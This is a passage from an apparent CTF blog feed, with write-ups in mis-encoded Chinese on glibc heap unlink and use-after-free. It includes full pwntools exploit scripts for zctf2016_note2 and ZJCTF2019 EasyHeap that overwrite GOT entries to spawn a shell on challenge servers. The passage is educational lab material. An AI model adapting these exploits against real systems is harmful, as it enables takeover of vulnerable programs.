./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class="hljs-comment"># param1 : old libc.so</span><br><span class="hljs-comment"># param2 : new libc.so</span><br><span class="hljs-comment"># param3 : path to elf</span><br></code></pre></td></tr></table></figure><h4 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h4><p><img src="/img/patchelf/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/11/25/ctf-pwn/unlink/"/>
    <url>/2022/11/25/ctf-pwn/unlink/</url>
    
    <content type="html"><![CDATA[<p>åŸç†</p><blockquote><p>ä»¥ä¸‹å†…å®¹ä¸€å¾‹å‡è®¾ sz = 4 bytes  ï¼Œ32ä½ç³»ç»Ÿ</p></blockquote><h4 id="unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†"><a href="#unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†" class="headerlink" title="unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†"></a>unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†</h4><p>å‡è®¾éœ€è¦ä»binä¸­æ‘˜é™¤ä¸€ä¸ª<strong>é¦–åœ°å€ä¸ºP</strong>çš„chunk</p><p>32ä½ç³»ç»Ÿä¸‹ï¼Œfdç›¸å¯¹äºå—é¦–çš„åç§»ä¸º8ï¼ˆprevsizeå’Œsizeéƒ½æ˜¯4å­—èŠ‚ï¼‰ï¼Œbkåç§»ä¸º12</p><p>å³ <code>fd = P+8 </code> ï¼Œ<code>bk = P+12</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// unlinkæ—¶éœ€è¦ å°†P.fdæŒ‡å‘çš„å—çš„bk èµ‹å€¼ä¸º P.bkä¸Šçš„å€¼</span><br>*(*(P+<span class="hljs-number">8</span>)+<span class="hljs-number">12</span>) = *(P+<span class="hljs-number">12</span>)<br><span class="hljs-comment">// å°†P.bkæŒ‡å‘çš„å—çš„fd èµ‹å€¼ä¸º P.fdä¸Šçš„å€¼</span><br>*(*(P+<span class="hljs-number">12</span>)+<span class="hljs-number">8</span>) = *(P+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>å‡è®¾æƒ³è¦å‘0x4000000Cè¿™ä¸ªåœ°å€ä¸Šå†™å…¥0xdeadbeefè¿™ä¸ªå€¼</p><p>åªéœ€å°†<code>*(P+8)</code>èµ‹å€¼ä¸º0x40000000ï¼Œå°†<code>*(P+12)</code>èµ‹å€¼ä¸º0xdeadbeefï¼Œåœ¨unlinkæ—¶å°±ä¼šå®Œæˆèµ‹å€¼</p><p>è¿™ç§æ–¹æ³•æ˜¯å°†fdè®¾ç½®ä¸ºäº†target addr - 12 ï¼Œbkè®¾ç½®ä¸ºäº†expect value</p><blockquote><p>ä¹Ÿå¯ä»¥å°†fdè®¾ç½®ä¸ºexpect valueï¼Œbkè®¾ç½®ä¸ºtarget addr - 8ï¼Œä½†æ˜¯åæ–‡é»˜è®¤å‡ä½¿ç”¨å‰ä¸€ç§æ”»å‡»æ–¹æ³•</p></blockquote><p>unlinkæ¼æ´åŒæ—¶å‘ä¸¤ä¸ªåœ°å€è¿›è¡Œäº†å†™å…¥ï¼Œæ‰€ä»¥åœ¨ä¿è¯targe taddr -12 å¯ä»¥å†™å…¥çš„åŒæ—¶ï¼Œä¹Ÿè¦ä¿è¯expect value + 8 æœ‰å†™å…¥æƒé™</p><h4 id="ä¸Šé¢è¿™äº›éƒ½æ²¡ç”¨"><a href="#ä¸Šé¢è¿™äº›éƒ½æ²¡ç”¨" class="headerlink" title="ä¸Šé¢è¿™äº›éƒ½æ²¡ç”¨"></a>ä¸Šé¢è¿™äº›éƒ½æ²¡ç”¨</h4><p><img src="/img/unlink/1.jpg"></p><h4 id="åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å"><a href="#åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å" class="headerlink" title="åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å"></a>åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>å› æ­¤æº¢å‡ºæ—¶éœ€è¦é¢å¤–ä¿è¯ä»¥ä¸‹æ¡ä»¶</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">*(<span class="hljs-name">*</span>(<span class="hljs-name">P+8</span>) <span class="hljs-number">+12</span>) == P<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">P+12</span>)+ <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°å †ç®¡ç†åˆ—è¡¨é‡Œé¢æŒ‡å‘chunk Pçš„æŒ‡é’ˆ<strong>ptr</strong>ï¼Œè®©Pçš„fdæŒ‡å‘ptr-12ï¼ŒPçš„bkæŒ‡å‘ptr-8ï¼Œè¿™æ ·P-&gt;fd-&gt;bkæŒ‡å‘Pï¼ŒP-&gt;bk-&gt;fdä¹ŸæŒ‡å‘Pã€‚</p><p>ç»•è¿‡ifåˆ¤æ–­ä¹‹åï¼Œä¸‹é¢ä¸¤æ¡èµ‹å€¼è¯­å¥é¦–å…ˆå°† FD-&gt;bkï¼ˆä¹Ÿå°±æ˜¯ptrï¼‰æŒ‡å‘äº†BKï¼Œå†å°†BK-&gt;fdï¼ˆè¿˜æ˜¯ptrï¼Œåˆæ”¹å˜äº†ä¸€æ¬¡ptrï¼‰æŒ‡å‘äº†FDã€‚</p><p>å› æ­¤åé¢è¿™ä¸¤æ¡èµ‹å€¼è¯­å¥ç¡®å®å®Œæˆäº†FDå’ŒBK unlink çš„æ•ˆæœï¼Œå”¯ä¸€è¢«æ”¹å˜çš„æ˜¯ptrï¼Œå®ƒä»åŸæœ¬æŒ‡å‘chunk pï¼Œå˜æˆäº†*(ptr - 12)</p><h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯unlinkçš„fakechunkå¤§å°ä¸èƒ½å°äºmax fastbinï¼Œå› ä¸ºfastbiné‡Œçš„æ ¹æœ¬æ²¡æœ‰æŠŠä¸‹ä¸€ä¸ªinuse bitç½®é›¶ï¼Œä¹Ÿå°±ä¸ä¼šå­˜åœ¨unlink</strong></p><p>ä½¿ç”¨äº†one gadgetï¼Œè¿˜æœ‰è¦†ç›–atoiçš„gotè¡¨éƒ½æˆåŠŸäº†ï¼Œä½†æ˜¯è¦†ç›–freeçš„gotè¡¨ï¼Œå†delete(2)å´ä¸èƒ½æˆåŠŸï¼Œä¸çŸ¥é“åŸå› </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./note2&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./note2&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25956</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;)&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, choice, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;]&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;abc&quot;</span>) <span class="hljs-comment"># name</span><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;def&quot;</span>) <span class="hljs-comment"># addr</span><br><br>ptr = <span class="hljs-number">0x602120</span><br>fd = ptr - <span class="hljs-number">0x18</span><br>bk = ptr - <span class="hljs-number">0x10</span><br><br>new(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(fd) + p64(bk) )<br>new(<span class="hljs-number">0x0</span>,  <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x10</span>)  <br>new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <br><br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">0x0</span>, <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x90</span>))  <span class="hljs-comment"># overflow </span><br><br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br>free_got = e.got[<span class="hljs-string">&quot;free&quot;</span>]<br>atoi_got = e.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x03&#x27;</span> * <span class="hljs-number">0x18</span> + p64(atoi_got))<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Content is &quot;</span>)<br><br>atoi = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;atoi :&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(atoi)))<br><br><br><span class="hljs-comment"># # local </span><br><span class="hljs-comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span><br><span class="hljs-comment">#libc.address =  atoi - libc.sym[&#x27;atoi&#x27;]</span><br><span class="hljs-comment">#system = libc.sym[&quot;system&quot;]</span><br><span class="hljs-comment">#log.info(&quot;system :&quot; + str(hex(system)))</span><br><span class="hljs-comment"># one_gadget :</span><br><span class="hljs-comment">#system = libc.address + 0xef9f4 </span><br><br><span class="hljs-comment"># remote</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;atoi&quot;</span>, atoi)<br>offset = atoi - libc.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span> , p64(system))<br><br>p.interactive() <span class="hljs-comment"># input /bin/sh</span><br></code></pre></td></tr></table></figure><h3 id="ZJCTF2019-EasyHeap"><a href="#ZJCTF2019-EasyHeap" class="headerlink" title="ZJCTF2019 EasyHeap"></a>ZJCTF2019 EasyHeap</h3><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p><p>å¾ˆæ˜æ˜¾åœ¨<code>ceate_heap</code>ä¸­sizeå¹¶æ²¡æœ‰å­˜ä¸‹æ¥ï¼Œç„¶å<code>edit_heap</code>æ—¶ä¹Ÿæ˜¯ç”¨æˆ·è‡ªå·±è¾“å…¥sizeæ¥ç¼–è¾‘</p><p>å› æ­¤å¯ä»¥æº¢å‡º</p><p>checksecå‘ç°æ²¡æœ‰å¼€å¯PIEï¼Œheaparrayçš„åœ°å€å¯ä»¥ç›´æ¥ä½¿ç”¨</p><ol><li><p>é¦–å…ˆç”³è¯·ä¸‰ä¸ªchunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>æ„é€ ä¸€ä¸ªunlinkéœ€è¦åœ¨ç¬¬ä¸€ä¸ªchunkå†…æ„é€ ä¸€ä¸ªfakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure><p><img src="/img/%5BZJCTF2019%5DEasyHeap/1.jpg"></p><p>å¯¹äºchunk 0ï¼Œ<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>ï¼Œunlink chunk 0 æ—¶ä¼šå°†heaparray[0]æŒ‡å‘<code>heaparray - 0x18</code></p></li><li><p>è¿™æ—¶delete(1)ï¼Œä¼šå°†chunk 1 å’Œ fakechunk åˆå¹¶èµ·æ¥æ”¾å…¥ unsorted bin</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/2.jpg"></p><p>æŸ¥çœ‹heaparrayåœ°å€ä¸Šçš„å€¼ï¼š</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/3.jpg"></p><p>è¯´æ˜fakechunkæˆåŠŸå®Œæˆunlinkæ“ä½œï¼Œheaparray[0]æŒ‡å‘äº†0x6020c8</p></li><li><p>è¿™æ—¶edit(0)ä¼šä»0x6020c8è¿™ä¸ªåœ°å€å¼€å§‹å†™ï¼Œå› æ­¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure><p>åˆä¸€æ¬¡è¦†ç›–äº†heaparray[0]ï¼ŒæŒ‡å‘äº†<code>free@got</code></p></li><li><p>è¿™æ—¶edit(0)ä¼šä¿®æ”¹<code>free@got</code>çš„å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure><p>å°†å…¶å‡½æ•°æ”¹ä¸ºsystemå‡½æ•°çš„pltè¡¨</p></li><li><p>delete(2)ä¼šè°ƒç”¨free(â€œ/bin/shâ€)ï¼Œè€Œfreeå‡½æ•°è¢«æ›¿æ¢æˆäº†systemï¼Œå› æ­¤å¾—åˆ°äº†shell</p></li></ol><h4 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2022/11/22/ctf-pwn/UAF/"/>
    <url>/2022/11/22/ctf-pwn/UAF/</url>
    
    <content type="html"><![CDATA[<h4 id="å‚è€ƒctf-wiki"><a href="#å‚è€ƒctf-wiki" class="headerlink" title="å‚è€ƒctf-wiki"></a>å‚è€ƒctf-wiki</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p>ä»¥ä¸‹å®éªŒæ‰€ç”¨ç¨‹åºï¼ˆä¸æºç ï¼‰è§ä¸Šè¿°é“¾æ¥ä¸­æ–‡ä»¶hacknoteï¼ˆä¸hacknote.cï¼‰</p><h4 id="æ¼æ´çš„å‘ç°"><a href="#æ¼æ´çš„å‘ç°" class="headerlink" title="æ¼æ´çš„å‘ç°"></a>æ¼æ´çš„å‘ç°</h4><p>åœ¨<code>del_note()</code>å‡½æ•°ä¸­freeæ‰æŒ‡é’ˆä¹‹åæ²¡æœ‰æ¸…é›¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= count) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (notelist[idx]) &#123;<br>    <span class="hljs-built_in">free</span>(notelist[idx]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// å¹¶ä¸”åœ¨add_noteä¸­æ˜¯æ ¹æ®notelist[i]æ˜¯å¦ä¸ºnullptråˆ¤æ–­åœ¨å“ªä¸ªä½ç½®addæ–°note</span><br></code></pre></td></tr></table></figure><p>ç¨‹åºä¸­ç»™äº†systemï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>æ¼æ´åˆ©ç”¨æ–¹æ³•</h4><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>ä¸‹é¢ä»‹ç»è¿™ä¸ªexpçš„åŸç†</p><p>åœ¨delete 0å’Œ1ä¹‹åfastbinç»“æ„å¦‚ä¸‹å›¾</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; 